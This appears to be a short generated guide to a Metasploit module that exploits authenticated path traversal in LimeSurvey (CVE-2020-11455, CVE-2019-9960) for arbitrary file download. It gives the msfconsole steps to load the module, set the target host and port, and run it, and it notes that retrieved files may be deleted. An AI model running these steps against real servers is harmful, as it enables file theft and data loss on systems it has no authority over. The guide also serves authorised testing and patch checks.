**The description of current metasploit exploit**
This module exploits an authenticated path traversal vulnerability found in LimeSurvey          versions between 4.0 and 4.1.11 with CVE-2020-11455 or <= 3.15.9 with CVE-2019-9960,          inclusive.          In CVE-2020-11455 the getZipFile function within the filemanager functionality          allows for arbitrary file download.  The file retrieved may be deleted after viewing,          which was confirmed in testing.          In CVE-2019-9960 the szip function within the downloadZip functionality allows          for arbitrary file download.          Verified against 4.1.11-200316, 3.15.0-181008, 3.9.0-180604, 3.6.0-180328,          3.0.0-171222, and 2.70.0-170921.

---

**The usage instruction:**

Start by loading the module:

```bash
use auxiliary/scanner/http/limesurvey_zip_traversals
```

Then set the required options:

```bash
# Required parameters with no default value
set RHOSTS <your target host(s) here>
```

Carefully review the following network-related parameters. These have default values but **may need to be changed** depending on your environment:

* RPORT – default: 80 - The target port (TCP)

If the defaults match your setup, you do **not** need to change them. Otherwise, override them using `set`.

Finally, run the exploit:

```bash
exploit
```
Note:
1. Please execute the command step by step.
2. You can change default value if need.
3. You need to pay attention to whether the default RPORT is consistent with the port where the current service is running.